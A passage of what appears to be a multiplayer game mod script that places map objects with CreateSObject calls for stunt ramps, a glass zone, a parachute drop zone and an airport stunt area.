	CreateSObject(2918,-503.05,353.55,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-484.00,363.14,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-484.00,363.14,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-486.49,361.32,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.81,359.62,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.17,357.89,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.96,355.90,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-496.29,354.23,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.76,352.46,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-501.16,350.74,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-481.51,359.80,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-483.89,358.10,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-486.20,356.44,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.60,354.72,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.43,352.70,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.80,351.00,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-496.30,349.21,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.76,347.44,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-479.44,357.01,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-479.44,357.01,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-481.95,355.21,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-484.45,353.42,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-486.95,351.63,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-489.35,349.91,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.60,348.30,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-494.22,346.42,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-496.72,344.63,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(4563,-414.28,364.15,1161.53,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(4563,-414.28,364.15,1161.53,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(4563,-435.08,306.82,1161.53,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(4563,-509.55,306.94,1161.51,0.00,0.00,306.31,object_show_distance,0,world_stunts);
	CreateSObject(3997,-475.06,355.69,1335.87,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	// Glass Objects
	dbg(11,"6c3");
	ReloadGlass();
	CreateSObject(19125, 3196.8701171875, 5140.3798828125, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3184.9599609375, 5140.4599609375, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3176.5200195313, 5140.3100585938, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3167.6000976563, 5140.0600585938, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3160.6799316406, 5132.990234375, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3160.7800292969, 5123.990234375, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3160.6599121094, 5115.8901367188, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3160.7399902344, 5109.4399414063, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3167.3500976563, 5104.009765625, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3176.1201171875, 5104.0400390625, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3185.5500488281, 5104.080078125, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3196.3000488281, 5104.1201171875, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3204.4599609375, 5110.3901367188, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3204.5200195313, 5116.6801757813, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3204.6101074219, 5124.0498046875, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	CreateSObject(19125, 3204.5900878906, 5132.2797851563, 31.579999923706, 0, 0, 0, object_show_distance, 0, world_glass);
	// Parachute Zone
	CreateSObject(7584, 2832.3269042969, 1006.0280151367, 2210.3149414063, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 2210.3149414063, 0, 0, 180,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 2113.541015625, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 2017.6999511719, 0, 0, 180,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3259277344, 1006.0269775391, 2113.3330078125, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3249511719, 1006.0260009766, 2017.7180175781, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2859.6770019531, 1060.3859863281, 2206.7780761719, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2842.666015625, 1060.6989746094, 2206.7780761719, 0, 0, 356,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2865.6750488281, 1029.126953125, 2200.4770507813, 0, 0, 355.99548339844,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2827.0258789063, 1055.7659912109, 2206.7780761719, 0, 0, 355.99548339844,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2850.3620605469, 1023.0800170898, 2200.455078125, 0, 0, 355.99548339844,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2809.330078125, 1043.8249511719, 2206.7780761719, 0, 0, 355.99548339844,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2827.0109863281, 1019.6060180664, 2206.7780761719, 0, 0, 175.99548339844,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2798.0090332031, 1032.0389404297, 2206.7780761719, 0, 0, 175.98999023438,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2781.3549804688, 1020.8699951172, 2206.7780761719, 0, 0, 175.98999023438,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2782.4470214844, 1019.2420043945, 2206.7780761719, 0, 0, 265.98999023438,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2814.9089355469, 1042.8249511719, 2213.3278808594, 0, 0, 265.98449707031,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2855.5170898438, 1068.1090087891, 2213.3278808594, 0, 0, 77.984497070313,object_show_distance, 0, world_parachuting);
	CreateSObject(16073, 2890.7800292969, 1086.9000244141, 2207.8310546875, 0, 0, 77.98095703125,object_show_distance, 0, world_parachuting);
	CreateSObject(16080, 2910.7729492188, 1049.6459960938, 2107.212890625, 0, 344, 330,object_show_distance, 0, world_parachuting);
	CreateSObject(16080, 2903.4270019531, 1033.0689697266, 2107.212890625, 0, 343.99841308594, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(16080, 2902.6479492188, 1014.4520263672, 2107.212890625, 0, 343.99841308594, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(16080, 2892.8940429688, 995.18902587891, 2107.212890625, 0, 343.99841308594, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(16080, 2866.3688964844, 1092.1939697266, 2107.212890625, 0, 343.99841308594, 29.996337890625,object_show_distance, 0, world_parachuting);
	CreateSObject(16080, 2880.7280273438, 1077.8409423828, 2107.212890625, 0, 343.99291992188, 29.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(8397, 2816.4929199219, 1037.6469726563, 2019.1459960938, 88, 0, 298,object_show_distance, 0, world_parachuting);
	CreateSObject(8397, 2834.748046875, 1047.3179931641, 2018.2950439453, 86.999847412109, 180, 297.99871826172,object_show_distance, 0, world_parachuting);
	CreateSObject(8397, 2841.1689453125, 1034.8139648438, 2018.2950439453, 86.995239257813, 179.99450683594, 297.99865722656,object_show_distance, 0, world_parachuting);
	CreateSObject(8397, 2822.9929199219, 1025.1190185547, 2019.1459960938, 87.994995117188, 0, 297.99865722656,object_show_distance, 0, world_parachuting);
	CreateSObject(8397, 2809.876953125, 1049.8819580078, 2019.1459960938, 87.994995117188, 0, 297.99865722656,object_show_distance, 0, world_parachuting);
	CreateSObject(8397, 2828.2028808594, 1059.6030273438, 2018.2950439453, 86.995239257813, 179.99450683594, 297.99865722656,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3239746094, 1006.0250244141, 1920.9520263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1921.0389404297, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1824.1330566406, 0, 0, 180,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3229980469, 1006.0239868164, 1824.1560058594, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3220214844, 1006.0230102539, 1727.2440185547, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1727.2130126953, 0, 0, 180,object_show_distance, 0, world_parachuting);
	CreateSObject(5463, 2803.3500976563, 1030.6080322266, 1934.0620117188, 0, 0, 300,object_show_distance, 0, world_parachuting);
	CreateSObject(5463, 2830.1259765625, 1046.0860595703, 1934.126953125, 0, 0, 299.99816894531,object_show_distance, 0, world_parachuting);
	CreateSObject(5463, 2857.0080566406, 1061.6140136719, 1934.2719726563, 0, 0, 299.99816894531,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2820.7209472656, 1068.1960449219, 1799.9830322266, 0, 0, 320,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2785.6188964844, 1035.8909912109, 1799.9830322266, 0, 0, 19.998779296875,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2853.1101074219, 1079.6639404297, 1799.9830322266, 0, 0, 289.9951171875,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2875.4741210938, 1058.8229980469, 1799.9830322266, 0, 0, 219.98962402344,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2833.3491210938, 1052.8100585938, 1805.8299560547, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2809.5720214844, 1041.5529785156, 1805.8299560547, 0, 0, 20,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2804.4509277344, 1009.616027832, 1805.8299560547, 0, 0, 79.9951171875,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2822.7180175781, 1035.8719482422, 1805.8299560547, 0, 0, 19.991455078125,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2831.7429199219, 1032.6970214844, 1805.8299560547, 0, 0, 219.98962402344,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2854.2338867188, 1045.3819580078, 1805.8299560547, 0, 0, 219.98474121094,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2828.4560546875, 1038.3239746094, 1805.8299560547, 0, 0, 219.98474121094,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2844.12109375, 1052.3950195313, 1805.8299560547, 0, 0, 219.98474121094,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2836.41796875, 1022.1459960938, 1709.0760498047, 0, 0, 139.9951171875,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2863.3039550781, 1052.9770507813, 1709.0760498047, 0, 0, 179.99328613281,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2795.6879882813, 1016.7080078125, 1709.0760498047, 0, 0, 99.989013671875,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2836.1298828125, 1049.9460449219, 1713.4610595703, 0, 0, 210,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2825.2890625, 1043.0670166016, 1713.4610595703, 0, 0, 209.99816894531,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2811.4460449219, 1036.2180175781, 1713.4610595703, 0, 0, 169.99816894531,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2849.5500488281, 1070.9460449219, 1713.4610595703, 0, 0, 229.99694824219,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2820.1140136719, 1065.4620361328, 1713.4610595703, 0, 0, 9.9932861328125,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2818.7109375, 1055.1779785156, 1713.4610595703, 0, 0, 9.9920654296875,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2800.1630859375, 1043.9620361328, 1713.4610595703, 0, 0, 9.9920654296875,object_show_distance, 0, world_parachuting);
	CreateSObject(7916, 2823.5859375, 1062.8380126953, 1713.4610595703, 0, 0, 9.9920654296875,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1630.4370117188, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3210449219, 1006.0219726563, 1630.4429931641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3200683594, 1006.0219726563, 1533.5760498047, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1533.5350341797, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2836.41796875, 1022.1459960938, 1583.4799804688, 0, 0, 139.99328613281,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2866.8969726563, 1051.9560546875, 1583.4799804688, 0, 0, 209.99328613281,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2842.9040527344, 1075.4420166016, 1583.4799804688, 0, 0, 269.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2802.4470214844, 1068.9949951172, 1583.4799804688, 0, 0, 339.98901367188,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2793.9519042969, 1036.9090576172, 1583.4799804688, 0, 0, 39.988403320313,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2778.4799804688, 1031.6340332031, 1583.4799804688, 0, 0, 39.984741210938,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2836.41796875, 1022.1459960938, 1479.8640136719, 0, 0, 139.99328613281,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2845.2661132813, 1054.0500488281, 1479.8640136719, 0, 0, 209.99328613281,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2859.2009277344, 1068.1939697266, 1479.8640136719, 0, 0, 9.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2795.9909667969, 1018.9270019531, 1479.8640136719, 0, 0, 89.992065429688,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1436.6149902344, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3190917969, 1006.0219726563, 1436.6450195313, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3181152344, 1006.0219726563, 1339.7030029297, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1339.6590576172, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1242.70703125, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3181152344, 1006.0219726563, 1242.7469482422, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2819.7280273438, 1070.8389892578, 1392.1870117188, 0, 0, 299.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2795.3010253906, 1041.1490478516, 1392.1870117188, 0, 0, 19.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2853.708984375, 1067.7110595703, 1392.1870117188, 0, 0, 279.98962402344,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2790.9760742188, 1025.1970214844, 1392.1870117188, 0, 0, 279.98657226563,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2840.0769042969, 1024.8640136719, 1293.2800292969, 0, 0, 139.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2866.1120605469, 1058.9770507813, 1293.2800292969, 0, 0, 209.98779296875,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2796.8811035156, 1020.2210083008, 1293.2800292969, 0, 0, 99.987182617188,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2790.9318847656, 1055.6750488281, 1293.2800292969, 0, 0, 19.986572265625,object_show_distance, 0, world_parachuting);
	CreateSObject(16114, 2798.0749511719, 1040.5279541016, 1293.2800292969, 0, 0, 69.984130859375,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2829.458984375, 1066.3050537109, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2804.9599609375, 1052.0789794922, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2827.7429199219, 1028.3149414063, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2841.0100097656, 1048.0600585938, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2804.7080078125, 1030.0460205078, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2820.8659667969, 1046.3380126953, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2852.9020996094, 1065.1979980469, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2859.9389648438, 1046.4959716797, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2870.9951171875, 1068.8680419922, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2847.1220703125, 1025.6280517578, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2788.9660644531, 1030.3830566406, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16776, 2814.91796875, 1065.4730224609, 1202.3570556641, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16135, 2802.1479492188, 1037.9680175781, 1146.5830078125, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2832.3181152344, 1006.0219726563, 1145.7700195313, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(7584, 2822.7509765625, 1083.75, 1145.7459716797, 0, 0, 179.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(16135, 2828.5959472656, 1033.0860595703, 1146.5830078125, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16135, 2829.4030761719, 1062.5489501953, 1146.5830078125, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(16135, 2851.1850585938, 1056.1379394531, 1146.5830078125, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2810.0700683594, 1044.5620117188, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2806.0610351563, 1044.5300292969, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2802.126953125, 1044.5200195313, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2802.0400390625, 1048.2650146484, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2801.9331054688, 1052.4360351563, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2805.8869628906, 1052.4169921875, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2809.9899902344, 1052.3759765625, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2801.8549804688, 1056.4360351563, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2801.8210449219, 1060.5579833984, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2805.5959472656, 1060.5780029297, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2809.4450683594, 1060.6030273438, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2823.8110351563, 1044.4709472656, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2823.8798828125, 1048.5710449219, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2823.8210449219, 1052.7440185547, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2823.8369140625, 1056.91796875, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2823.8278808594, 1061.0930175781, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2827.8889160156, 1058.9770507813, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2831.12109375, 1055.0109863281, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2834.0170898438, 1050.4379882813, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2835.5668945313, 1045.9050292969, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2839.1049804688, 1044.873046875, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2839.0249023438, 1048.8220214844, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2839.0170898438, 1052.9189453125, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2839.037109375, 1056.7709960938, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2839.0080566406, 1060.7449951172, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2848.3920898438, 1060.7989501953, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2848.3979492188, 1056.8480224609, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2848.4528808594, 1052.873046875, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2848.4331054688, 1048.8969726563, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2848.5358886719, 1044.8470458984, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2852.5629882813, 1045.0849609375, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2856.5659179688, 1046.1429443359, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2860.3930664063, 1049.8950195313, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2862.4799804688, 1054.125, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2860.54296875, 1058.3220214844, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2856.7338867188, 1061.4709472656, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3374, 2852.2739257813, 1061.7020263672, 1068.3270263672, 0, 0, 0,object_show_distance, 0, world_parachuting);
	CreateSObject(3359, 2804.9030761719, 1084.04296875, 2262.0568847656, 0, 0, 30,object_show_distance, 0, world_parachuting);
	CreateSObject(3359, 2850.3588867188, 1006.3319702148, 2262.0568847656, 0, 0, 209.99816894531,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2851.6240234375, 1017.133972168, 2264.8310546875, 0, 0, 330,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2858.6298828125, 1013.1060180664, 2264.8310546875, 0, 0, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2863.6088867188, 1006.5689697266, 2264.8310546875, 0, 0, 269.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2858.6579589844, 998.93298339844, 2264.8278808594, 0, 0, 209.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2851.6550292969, 994.87298583984, 2264.8278808594, 0, 0, 209.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2843.0568847656, 994.28302001953, 2264.8310546875, 0, 0, 149.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2839.4929199219, 1009.883972168, 2264.8310546875, 0, 0, 269.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2839.482421875, 1001.8076171875, 2264.8310546875, 0, 0, 269.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2803.4250488281, 1072.6419677734, 2264.8310546875, 0, 0, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2796.4230957031, 1076.7030029297, 2264.8310546875, 0, 0, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2811.1459960938, 1096.0560302734, 2264.8310546875, 0, 0, 329.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2804.0480957031, 1095.2919921875, 2264.8278808594, 0, 0, 209.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2795.7509765625, 1090.4560546875, 2264.8278808594, 0, 0, 209.99267578125,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2815.5390625, 1088.9329833984, 2264.8310546875, 0, 0, 269.99633789063,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2791.6376953125, 1083.634765625, 2264.8278808594, 0, 0, 269.99450683594,object_show_distance, 0, world_parachuting);
	CreateSObject(980, 2815.5170898438, 1079.0770263672, 2264.8310546875, 0, 0, 269.99450683594,object_show_distance, 0, world_parachuting);
	// LS AP
	CreateSObject(18859,2043.78,-2432.73,23.81,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18859,2090.96,-2437.44,23.81,0.00,0.00,348.70, object_show_distance, 0, world_stunts);
	CreateSObject(18859,2131.20,-2457.29,23.81,0.00,0.00,319.00, object_show_distance, 0, world_stunts);
	CreateSObject(18750,1856.23,-2649.22,44.30,91.00,0.00,-180.00, object_show_distance, 0, world_stunts);
	CreateSObject(18750,1643.76,-2649.17,44.30,91.00,0.00,-180.00, object_show_distance, 0, world_stunts);
	CreateSObject(18777,1972.78,-2541.47,93.09,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18777,1972.77,-2541.48,15.09,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18777,1972.77,-2541.48,41.07,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18777,1972.77,-2541.48,67.09,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18772,1992.77,-2416.47,119.09,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18778,1992.16,-2288.31,117.90,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18778,1992.16,-2288.31,117.90,11.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18800,1807.07,-2540.87,23.60,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18800,1747.38,-2540.88,47.18,0.00,0.00,179.55, object_show_distance, 0, world_stunts);
	CreateSObject(18800,1807.07,-2540.87,70.74,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18800,1747.38,-2540.88,94.29,0.00,0.00,179.55, object_show_distance, 0, world_stunts);
	CreateSObject(18800,1807.07,-2540.87,117.84,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18789,1702.24,-2563.73,129.93,0.00,0.00,0.00, object_show_distance, 0, world_stunts);
	CreateSObject(18790,1580.36,-2563.97,104.64,0.00,0.00,0.10, object_show_distance, 0, world_stunts);
	CreateSObject(18801,1556.32,-2555.34,130.03,0.00,0.00,7.29, object_show_distance, 0, world_stunts);
